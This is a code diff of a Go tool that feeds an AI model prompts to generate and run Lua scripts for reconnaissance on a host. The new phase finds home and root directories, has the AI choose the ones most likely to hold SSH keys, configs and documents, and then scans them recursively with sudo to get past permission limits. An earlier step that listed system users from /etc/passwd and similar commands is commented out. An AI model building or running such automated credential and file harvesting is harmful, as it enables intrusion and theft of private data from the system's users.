@@ -265,22 +265,43 @@ func main() {
 	var intermediateContext string = "PROBE_DATA: " + executeWithRetry("Probe", "Given the previously identified OS, Generate Lua code to print User, Home dir, as well as paths from the top-most directory(list the directories available from the very top of the filesystem). Make use of lfs.")
 	currentContext = intermediateContext
 	// --- NEW STEP: USER DISCOVERY ---
-	fmt.Println("[*] Phase 1.5: Harvesting System User List...")
-	userListPrompt := `Using the identified OS, generate Lua code to list all human users.
-	- For Linux/Unix: Print the names from /etc/passwd that have 
-	'local uid = tonumber(fields[3])
-if uid >= 1000 or uid == 0 then
-    print(username)
-end'
-	- For Windows: Execute 'net user' and print the output.
-	- For macOS: Execute 'dscl . list /Users'.
-	Only print the usernames, one per line.`
+	// 	fmt.Println("[*] Phase 1.5: Harvesting System User List...")
+	// 	userListPrompt := `Using the identified OS, generate Lua code to list all human users.
+	// 	- For Linux/Unix: Print the names from /etc/passwd that have
+	// 	'local uid = tonumber(fields[3])
+	// if uid >= 1000 or uid == 0 then
+	//     print(username)
+	// end'
+	// 	- For Windows: Execute 'net user' and print the output.
+	// 	- For macOS: Execute 'dscl . list /Users'.
+	// 	Only print the usernames, one per line.`
 
-	// Execute and save to Global Context
-	usersFound := executeWithRetry("Discover Users", userListPrompt)
-	globalContext += "\nAVAILABLE_SYSTEM_USERS:\n" + usersFound
+	// // Execute and save to Global Context
+	// usersFound := executeWithRetry("Discover Users", userListPrompt)
+	// globalContext += "\nAVAILABLE_SYSTEM_USERS:\n" + usersFound
+	// --- NEW PHASE 1.5: TARGETED DIRECTORY DISCOVERY ---
+	fmt.Println("[*] Phase 1.5: Identifying and Analyzing User Directories...")
 
-	intermediateContext = "SCAN_DATA: " + executeWithRetry("Scan", `You are a cybersecurity red team member looking for sensitive files in the system. Generate Lua code using lfs to recursively scan important directories found previously, like the users and their files.
+	// STEP A: Get the raw directory listing
+	discoveryPrompt := `Generate Lua code using lfs to list every subdirectory inside '/home' and also check if '/root' exists. 
+Only print the full absolute paths, one per line.`
+	foundPaths := executeWithRetry("Discover Paths", discoveryPrompt)
+
+	// STEP B: The AI reasoning step (No Lua execution here)
+	// We ask the AI to pick the "best" targets from the raw list
+	selectionPrompt := fmt.Sprintf(`Based on this list of directories:
+%s
+
+As a security auditor, identify which 2-3 directories are most likely to contain sensitive user data (SSH keys, configs, documents). 
+Return ONLY the paths as a comma-separated list.`, foundPaths)
+
+	targetedPaths := askAI("Targeting Reasoning", selectionPrompt, globalContext)
+	fmt.Printf("[+] AI Selected Targets: %s\n", targetedPaths)
+
+	// Save to Global Context for the next Phase (Scan)
+	globalContext += "\nTARGETED_USER_DIRECTORIES: " + targetedPaths
+
+	intermediateContext = "SCAN_DATA: " + executeWithRetry("Scan", `You are a cybersecurity red team member looking for sensitive files in the system. Generate Lua code using lfs to ONLY recursively scan real user directories.
 STRICT RULES:
 0. Use sudo or other os equivalent command to overcome permission errors.
 1. NO SHEBANG: Do not start with #!. Start directly with comments or code.
